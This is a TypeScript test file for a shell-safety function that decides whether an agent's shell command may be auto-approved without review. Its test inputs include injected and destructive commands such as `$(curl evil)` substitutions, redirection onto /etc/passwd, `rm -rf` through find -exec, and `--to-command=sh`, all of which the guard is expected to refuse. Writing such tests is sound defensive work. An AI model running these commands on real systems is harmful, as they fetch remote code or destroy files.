/**
 * #957: `matchCoveredCommand` resolves its mutation veto per segment.
 *
 * Two things must hold, and they pull in opposite directions:
 *
 *  1. Existing callers are UNCHANGED. This function gates a 0ms approval with
 *     no LLM in the loop and is shared with the user `allow` path; #536 (a P0)
 *     is the bug it exists to prevent. A refactor here that quietly widens
 *     coverage is the same class of defect.
 *  2. A caller that supplies `vetoForMatched` can permit a mutation on a
 *     segment its own curated entry covered — which is the whole point, since
 *     the blanket veto rejects every write-side prefix by construction.
 */

import { describe, expect, test } from 'bun:test';
import { MUTATION_TOKEN } from '../../src/auto-approve/permission-groups.ts';
import { matchCoveredCommand } from '../../src/auto-approve/shell-safety.ts';

/** The REAL blanket veto `matchReadOnlyCommand` passes, imported rather than
 *  copied (#957 review). A hand-copied regex stays byte-identical until the
 *  day someone widens the real one, after which these "existing callers are
 *  unchanged" tests would keep passing against a veto the shipped code no
 *  longer uses. */
const readVeto = (segment: string): boolean => MUTATION_TOKEN.test(segment);

const READS = ['git status', 'cat', 'grep', 'ls'];

describe('existing callers are unchanged', () => {
  test('a plain covered read still matches', () => {
    expect(matchCoveredCommand('git status', READS, readVeto)).toBe('git status');
  });

  test('an uncovered segment still falls through', () => {
    expect(matchCoveredCommand('git status && curl https://x', READS, readVeto)).toBeNull();
  });

  test('a mutation flag on a matched segment is still vetoed', () => {
    expect(matchCoveredCommand('git status --output=f', READS, readVeto)).toBeNull();
  });

  test('a mutation flag on a NEUTRAL segment is still vetoed', () => {
    // The ordering case the refactor had to preserve: `extraVeto` used to run
    // ahead of the neutral check for every segment. If the neutral branch
    // stopped consulting it, this would silently start matching.
    expect(
      matchCoveredCommand('cd --output=/etc/passwd && git status', READS, readVeto),
    ).toBeNull();
  });

  test('shell control is still refused', () => {
    expect(matchCoveredCommand('git status > /etc/passwd', READS, readVeto)).toBeNull();
    expect(matchCoveredCommand('git status; $(curl evil)', READS, readVeto)).toBeNull();
  });

  test('an exec primitive is still refused when the entry does not carry it', () => {
    expect(matchCoveredCommand('find . -exec rm -rf {} +', ['find'], readVeto)).toBeNull();
  });

  test('a command of only neutral segments matches nothing', () => {
    expect(matchCoveredCommand('cd /tmp && echo hi', READS, readVeto)).toBeNull();
  });

  test('#536 regression: a tool-name entry never covers a Bash command', () => {
    // `Read` as a prefix must not cover `rm -rf Readme`. Guarded upstream by
    // tool-name detection, asserted here because this function is the layer
    // that would approve it at 0ms if it ever did match.
    expect(matchCoveredCommand('rm -rf Readme', ['Read'], readVeto)).toBeNull();
  });
});

describe('vetoForMatched governs matched segments', () => {
  const WRITES = ['mkdir', 'touch', 'cp'];

  test('baseline: a write-side prefix can match at all', () => {
    // Says nothing about the resolver on its own -- `mkdir -p build` carries
    // no MUTATION_TOKEN, so it would match with or without one. Kept as the
    // control for the test below, which is the one that needs the resolver.
    const permissive = (): boolean => false;
    expect(matchCoveredCommand('mkdir -p build', WRITES, readVeto, permissive)).toBe('mkdir');
  });

  test('the blanket veto no longer applies to a matched segment', () => {
    // THIS is the case that is unreachable without `vetoForMatched`:
    // `--output` is a MUTATION_TOKEN, so the blanket veto rejects the segment
    // before its prefix is ever consulted. Contrast the control above.
    const permissive = (): boolean => false;
    expect(matchCoveredCommand('cp --output=x y', WRITES, readVeto, permissive)).toBe('cp');
    // Same command, no resolver: the blanket veto refuses it. Pins the
    // difference the resolver actually makes.
    expect(matchCoveredCommand('cp --output=x y', WRITES, readVeto)).toBeNull();
  });

  test('but it still applies to neutral segments in the same command', () => {
    // The asymmetry that keeps a write group from loosening the whole command.
    const permissive = (): boolean => false;
    expect(
      matchCoveredCommand('cd --output=/etc && mkdir -p build', WRITES, readVeto, permissive),
    ).toBeNull();
  });

  test('the resolver receives the prefix that matched, not just the segment', () => {
    const seen: Array<[string, string]> = [];
    matchCoveredCommand(
      'mkdir -p build && touch build/x',
      WRITES,
      readVeto,
      (segment, matchedPrefix) => {
        seen.push([segment, matchedPrefix]);
        return false;
      },
    );
    expect(seen).toEqual([
      ['mkdir -p build', 'mkdir'],
      ['touch build/x', 'touch'],
    ]);
  });

  test('a per-segment veto can refuse one prefix while permitting another', () => {
    // What a real group profile does: `cp` is fine, `mkdir` is not.
    const onlyCp = (_segment: string, matchedPrefix: string): boolean => matchedPrefix !== 'cp';
    expect(matchCoveredCommand('cp a b', WRITES, readVeto, onlyCp)).toBe('cp');
    expect(matchCoveredCommand('mkdir -p build', WRITES, readVeto, onlyCp)).toBeNull();
    expect(matchCoveredCommand('cp a b && mkdir -p build', WRITES, readVeto, onlyCp)).toBeNull();
  });

  test('shell control and exec primitives still win over a permissive resolver', () => {
    // A group profile must not be able to buy its way past these: they are
    // about the command being a DIFFERENT command, not about mutation.
    const permissive = (): boolean => false;
    expect(matchCoveredCommand('mkdir -p $(curl evil)', WRITES, readVeto, permissive)).toBeNull();
    expect(matchCoveredCommand('cp a b > /etc/passwd', WRITES, readVeto, permissive)).toBeNull();
    expect(matchCoveredCommand('cp --to-command=sh a b', WRITES, readVeto, permissive)).toBeNull();
  });
});
